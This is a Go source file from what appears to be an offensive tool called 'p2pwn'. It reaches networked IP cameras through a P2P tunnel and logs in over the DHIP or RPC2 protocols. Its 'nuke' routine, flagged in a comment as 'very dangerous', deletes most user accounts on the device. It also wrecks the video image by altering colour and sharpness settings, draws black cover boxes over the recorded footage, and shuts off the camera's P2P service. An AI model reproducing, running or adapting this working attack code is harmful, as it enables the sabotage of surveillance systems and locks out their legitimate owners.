package core

// experimental do not use very dangerous

import (
	"fmt"
	"strings"
	"time"

	"github.com/thebadinteger/p2pwn/core/p2p"
)

type nukeSession struct {
	via    string
	get    func(name string) ([]any, error)
	set    func(name string, table any) error
	setSec func(name string, table any) error
	call   func(method string, params map[string]any) (map[string]any, error)
	closer func()
}

func (n NukeConfig) videoLevel() int {
	if n.Video == nil {
		return 0
	}
	v, err := getIntValue(n.Video)
	if err != nil || v <= 0 {
		return 0
	}
	return v
}

func (n NukeConfig) enabled() bool {
	return n.Delete || n.Box || n.Disable || n.videoLevel() > 0
}

func newNukeSession(tunnel *p2p.PTCPTunnel, login, pass string) (*nukeSession, error) {
	var dhipErr error
	if s, err := newNukeDHIP(tunnel, login, pass); err == nil {
		return s, nil
	} else {
		dhipErr = err
	}
	s, rpcErr := newNukeRPC2(tunnel, login, pass)
	if rpcErr != nil {
		return nil, fmt.Errorf("dhip 5000: %v rpc 80: %v", dhipErr, rpcErr)
	}
	return s, nil
}

func newNukeDHIP(tunnel *p2p.PTCPTunnel, login, pass string) (*nukeSession, error) {
	dhip, err := tunnel.NewDHIPClientOnPort(5000)
	if err != nil {
		return nil, err
	}
	if err := dhip.LoginNormal(login, pass); err != nil {
		dhip.Close()
		return nil, err
	}
	id := 100
	return &nukeSession{
		via: "dhip",
		get: func(name string) ([]any, error) {
			return dhipGetTable(dhip, name, id)
		},
		set: func(name string, table any) error {
			return dhipSetConfig(dhip, name, table, id)
		},
		call: func(method string, params map[string]any) (map[string]any, error) {
			return dhip.Call(method, params, id, nil, nil)
		},
		closer: func() { dhip.Close() },
	}, nil
}

func newNukeRPC2(tunnel *p2p.PTCPTunnel, login, pass string) (*nukeSession, error) {
	osd, err := newRPC2Session(tunnel, login, pass)
	if err != nil {
		return nil, err
	}
	id := 100
	return &nukeSession{
		via: "rpc",
		get: func(name string) ([]any, error) {
			return rpc2GetTable(osd.conn, osd.sess, osd.cookie, name, id)
		},
		set: func(name string, table any) error {
			return rpc2SetConfig(osd.conn, osd.sess, osd.cookie, name, table, id)
		},
		setSec: func(name string, table any) error {
			_, err := securitySetConfig(osd.conn, osd.sess, osd.cookie, name, table)
			return err
		},
		call: func(method string, params map[string]any) (map[string]any, error) {
			out, _, err := osd.conn.post("/RPC2", map[string]any{
				"method": method, "params": params, "id": id, "session": osd.sess,
			}, osd.cookie)
			return out, err
		},
		closer: osd.close,
	}, nil
}

func dhipSetConfig(dhip *p2p.DHIPClient, name string, table any, id int) error {
	r, err := dhip.Call("configManager.setConfig", map[string]any{
		"name": name, "table": table, "options": []any{},
	}, id, nil, nil)
	if err != nil {
		return err
	}
	if ok, _ := r["result"].(bool); !ok {
		return fmt.Errorf("setConfig %s rejected: %v", name, r["error"])
	}
	return nil
}

func rpc2SetConfig(conn *rpc2ConnSession, sess any, cookie, name string, table any, id int) error {
	r, _, err := conn.post("/RPC2", map[string]any{
		"method": "configManager.setConfig",
		"params": map[string]any{"name": name, "table": table, "options": []any{}},
		"id":     id, "session": sess,
	}, cookie)
	if err != nil {
		return err
	}
	if ok, _ := r["result"].(bool); !ok {
		return fmt.Errorf("setConfig %s rejected: %v", name, r["error"])
	}
	return nil
}

func nukeKeepUser(name, dummy string) bool {
	if name == "" || name == "admin" {
		return true
	}
	if dummy != "" && name == dummy {
		return true
	}
	return strings.EqualFold(name, "Admin")
}

func nukeDeleteUsers(s *nukeSession, dummy string) (int, error) {
	r, err := s.call("userManager.getUserInfoAll", nil)
	if err != nil {
		return 0, err
	}
	if ok, _ := r["result"].(bool); !ok {
		return 0, fmt.Errorf("getUserInfoAll rejected: %v", r["error"])
	}
	users, _ := r["params"].(map[string]any)
	list, _ := users["users"].([]any)
	removed := 0
	for _, raw := range list {
		u, ok := raw.(map[string]any)
		if !ok {
			continue
		}
		name, _ := u["Name"].(string)
		if reserved, _ := u["Reserved"].(bool); reserved {
			continue
		}
		if nukeKeepUser(name, dummy) {
			continue
		}
		if _, err := s.call("userManager.deleteUser", map[string]any{"name": name}); err != nil {
			return removed, err
		}
		removed++
	}
	return removed, nil
}

func nukeColorSections(level int) []any {
	sections := make([]any, 0, 3)
	sections = append(sections, map[string]any{
		"Brightness": level, "ChromaSuppress": 50, "Contrast": level,
		"Gamma": level, "Hue": 50, "Saturation": level,
		"Style": "Standard", "TimeSection": "1 00:00:00-24:00:00",
	})
	for i := 0; i < 2; i++ {
		sections = append(sections, map[string]any{
			"Brightness": level, "ChromaSuppress": 50, "Contrast": level,
			"Gamma": level, "Hue": 50, "Saturation": level,
			"Style": "Standard", "TimeSection": "0 00:00:00-24:00:00",
		})
	}
	return sections
}

func nukeSharpSections(level int) []any {
	sharp := make([]any, 0, 3)
	for i := 0; i < 3; i++ {
		sharp = append(sharp, map[string]any{"Level": 50, "Mode": 1, "Sharpness": level})
	}
	return sharp
}

func nukeChannelTable(channels int, mk func() []any) []any {
	pad := 32
	if channels > pad {
		pad = channels
	}
	table := make([]any, 0, pad)
	for ch := 0; ch < pad; ch++ {
		if ch < channels {
			table = append(table, mk())
		} else {
			table = append(table, nil)
		}
	}
	return table
}

func nukeVideoSet(s *nukeSession, channels, level int) error {
	if channels < 1 {
		channels = 1
	}
	mkColor := func() []any { return nukeColorSections(level) }
	mkSharp := func() []any { return nukeSharpSections(level) }
	if channels == 1 {
		if err := s.set("VideoColor", []any{mkColor()}); err != nil {
			return err
		}
		return s.set("VideoInSharpness", []any{mkSharp()})
	}
	if err := s.set("VideoColor", nukeChannelTable(channels, mkColor)); err != nil {
		return err
	}
	return s.set("VideoInSharpness", nukeChannelTable(channels, mkSharp))
}

func nukeCovers(rects [][4]int) []any {
	covers := make([]any, 0, len(rects))
	for _, r := range rects {
		covers = append(covers, map[string]any{
			"BackColor":    []int{0, 0, 0, 128},
			"FrontColor":   []int{255, 255, 255, 0},
			"EncodeBlend":  true,
			"PreviewBlend": false,
			"Rect":         []int{r[0], r[1], r[2], r[3]},
		})
	}
	return covers
}

func nukeBox(s *nukeSession, channels int, rects [][4]int) error {
	table, err := s.get("VideoWidget")
	if err != nil {
		return err
	}
	covers := nukeCovers(rects)
	patched := 0
	apply := func(raw any) {
		m, ok := raw.(map[string]any)
		if !ok {
			return
		}
		m["Covers"] = covers
		patched++
	}
	for _, raw := range table {
		if nested, ok := raw.([]any); ok {
			for _, item := range nested {
				apply(item)
			}
			continue
		}
		apply(raw)
	}
	if patched == 0 {
		return fmt.Errorf("VideoWidget table shape unknown")
	}
	return s.set("VideoWidget", table)
}

func flipP2PFields(raw any, fields []string) int {
	patched := 0
	flip := func(item any) {
		m, ok := item.(map[string]any)
		if !ok {
			return
		}
		for _, f := range fields {
			if _, has := m[f]; has {
				m[f] = false
				patched++
			}
		}
	}
	if nested, ok := raw.([]any); ok {
		for _, item := range nested {
			flip(item)
		}
		return patched
	}
	flip(raw)
	return patched
}

func checkP2POff(raw any, fields []string) bool {
	items := []any{raw}
	if nested, ok := raw.([]any); ok {
		items = nested
	}
	for _, item := range items {
		m, ok := item.(map[string]any)
		if !ok {
			continue
		}
		for _, f := range fields {
			if v, has := m[f]; has && v != false {
				return false
			}
		}
	}
	return true
}

type p2pTableSpec struct {
	name   string
	fields []string
}

func shortErr(err error, n int) string {
	if err == nil {
		return ""
	}
	s := err.Error()
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "\r", " ")
	if len(s) > n {
		return s[:n]
	}
	return s
}

func disableTable(ss *nukeSession, spec p2pTableSpec) (ok, retry bool, note string) {
	table, err := ss.get(spec.name)
	if err != nil {
		return false, false, spec.name + " unreadable"
	}
	patched := 0
	for _, raw := range table {
		patched += flipP2PFields(raw, spec.fields)
	}
	if patched == 0 {
		return false, false, spec.name + " has no switch fields"
	}
	if err := ss.set(spec.name, table); err != nil {
		if ss.setSec != nil {
			if serr := ss.setSec(spec.name, table); serr == nil {
				if ok, retry, note := verifyTable(ss, spec); ok {
					return true, retry, note + " encrypted"
				} else {
					return false, retry, note
				}
			} else {
				return false, true, spec.name + " rejected plain (" + shortErr(err, 80) + ") and encrypted (" + shortErr(serr, 80) + ")"
			}
		}
		return false, true, spec.name + " rejected (" + shortErr(err, 80) + ")"
	}
	return verifyTable(ss, spec)
}

func verifyTable(ss *nukeSession, spec p2pTableSpec) (bool, bool, string) {
	check, err := ss.get(spec.name)
	if err != nil {
		if check, err = ss.get(spec.name); err != nil {
			return false, true, spec.name + " verify unreadable"
		}
	}
	for _, raw := range check {
		if !checkP2POff(raw, spec.fields) {
			return false, false, spec.name + " refused"
		}
	}
	return true, false, spec.name + " off via " + ss.via
}

func nukeDisableP2P(tunnel *p2p.PTCPTunnel, login, pass, serial string) (string, error) {
	s, err := newNukeSession(tunnel, login, pass)
	if err != nil {
		return "", err
	}
	defer s.closer()
	tables := []p2pTableSpec{
		{"VSP_PaaS", []string{"Enable", "Online"}},
		{"T2UServer", []string{"Enable"}},
	}
	var tried []string
	note := ""
	for _, spec := range tables {
		if ok, retry, n := disableTable(s, spec); ok {
			note = n
			break
		} else {
			tried = append(tried, n)
			if !retry {
				continue
			}
		}
		var alt *nukeSession
		var aerr error
		if s.via == "rpc" {
			alt, aerr = newNukeDHIP(tunnel, login, pass)
		} else {
			alt, aerr = newNukeRPC2(tunnel, login, pass)
		}
		if aerr != nil {
			tried = append(tried, "alt transport unavailable ("+shortErr(aerr, 80)+")")
			continue
		}
		if ok, _, n := disableTable(alt, spec); ok {
			alt.closer()
			note = n + " via alt"
			break
		} else {
			tried = append(tried, n+" (alt)")
		}
		alt.closer()
	}
	if note == "" {
		return "", fmt.Errorf("no p2p switch table (%s)", strings.Join(tried, ", "))
	}
	time.Sleep(5 * time.Second)
	if probeP2PAlive(serial) {
		return "", fmt.Errorf("%s but P2P tunnel still alive (reboot needed)", note)
	}
	return note + ", tunnel dead", nil
}

func probeP2PAlive(serial string) bool {
	for i := 0; i < 2; i++ {
		c := p2p.NewDHClient(serial)
		c.SetRetries(1)
		c.SetTimeout(10 * time.Second)
		err := c.Handshake()
		c.Close()
		if err == nil {
			return true
		}
	}
	return false
}

func runNuke(tunnel *p2p.PTCPTunnel, login, pass string, channels int, cfg NukeConfig, dummy string, serial string, armed bool) {
	if !armed || !cfg.enabled() {
		return
	}
	if until := p2p.DeviceLockedUntil(serial); !until.IsZero() {
		LogNukeResult(serial, "locked", false, fmt.Errorf("account locked until %s", until.Format("15:04:05")))
		return
	}
	s, err := newNukeSession(tunnel, login, pass)
	if err != nil {
		LogNukeResult(serial, "session", false, err)
		return
	}
	defer s.closer()

	if cfg.Delete {
		n, err := nukeDeleteUsers(s, dummy)
		if err != nil {
			LogNukeResult(serial, "delete", false, err)
		} else {
			LogNukeResult(serial, fmt.Sprintf("delete removed %d users", n), true, nil)
		}
	}
	if level := cfg.videoLevel(); level > 0 {
		if err := nukeVideoSet(s, channels, level); err != nil {
			LogNukeResult(serial, "video", false, err)
		} else {
			LogNukeResult(serial, fmt.Sprintf("video set to %d", level), true, nil)
		}
	}
	if cfg.Box {
		if err := nukeBox(s, channels, cfg.BoxRects); err != nil {
			LogNukeResult(serial, "box", false, err)
		} else {
			LogNukeResult(serial, "box applied", true, nil)
		}
	}
	// p2p off goes last once everything else is done with the camera
	if cfg.Disable {
		if note, err := nukeDisableP2P(tunnel, login, pass, serial); err != nil {
			LogNukeResult(serial, "disable", false, err)
		} else {
			LogNukeResult(serial, "disable "+note, true, nil)
		}
	}
}
